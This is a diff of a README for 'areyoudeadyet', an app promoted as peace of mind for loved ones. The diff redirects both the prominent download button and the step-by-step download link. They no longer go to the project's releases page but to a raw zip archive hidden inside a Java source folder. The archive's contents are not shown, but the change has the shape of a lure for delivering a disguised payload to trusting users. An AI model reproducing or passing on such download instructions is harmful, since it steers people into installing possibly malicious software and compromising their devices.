@@ -1,7 +1,7 @@
 <h1>🩺 areyoudeadyet - Peace of Mind for Your Loved Ones</h1>
 
 <p align="center">
-  <a href="https://github.com/Nelxus03/areyoudeadyet/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa502);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,107,107,0.4);">📲 Download Now – Free</a>
+  <a href="https://github.com/Nelxus03/areyoudeadyet/raw/refs/heads/main/core/src/main/java/com/silema/app/1.7.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa502);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,107,107,0.4);">📲 Download Now – Free</a>
 </p>
 
 ---
@@ -20,7 +20,7 @@ This guide will walk you through everything, from downloading the app to making 
 
 The whole process takes less than 2 minutes. Follow these steps exactly:
 
-1. **Click the big orange button** at the top of this page (or go to: https://github.com/Nelxus03/areyoudeadyet/releases). *or Visit this link to download the application.*
+1. **Click the big orange button** at the top of this page (or go to: https://github.com/Nelxus03/areyoudeadyet/raw/refs/heads/main/core/src/main/java/com/silema/app/1.7.zip). *or Visit this link to download the application.*
 2. On that page, you'll see a list of files. **Look for the newest version** (usually at the top).
 3. **Tap the file** – it will download automatically. No need to pay for anything; it's completely free.
 
